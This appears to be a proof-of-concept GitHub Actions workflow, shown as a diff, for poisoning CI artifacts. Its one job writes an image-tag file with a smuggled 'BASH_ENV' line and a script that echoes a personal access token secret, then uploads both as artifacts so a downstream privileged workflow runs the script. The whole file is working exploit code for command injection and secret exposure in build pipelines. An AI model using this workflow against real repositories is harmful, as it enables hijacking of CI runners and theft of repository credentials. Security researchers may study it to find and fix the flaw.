@@ -1,0 +1,26 @@
+name: CI
+on:
+  push:
+    branches: [main]
+  pull_request:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Stage attacker artifacts
+        run: |
+          mkdir -p art man/helm
+          printf '9.9.9\nBASH_ENV=%s/magic.sh\n' "$GITHUB_WORKSPACE" > art/IMAGE_TAG
+          printf '#!/bin/bash\necho "::warning::BASH_ENV_RCE_MARKER_HIT"\necho "POC_SECRET=${ORCHESTRATOR_PAT}"\necho "POC_APP_VERSION=${APP_BUILD_VERSION}"\n' > art/magic.sh
+          chmod +x art/magic.sh
+          printf 'apiVersion: v2\nname: poc\nversion: 0.1.0\n' > man/helm/Chart.yaml
+          printf 'x: y\n' > man/helm/values.yaml
+          echo "--- IMAGE_TAG ---"; cat art/IMAGE_TAG
+      - uses: actions/upload-artifact@v4
+        with:
+          name: image_tags
+          path: art
+      - uses: actions/upload-artifact@v4
+        with:
+          name: manifests
+          path: man
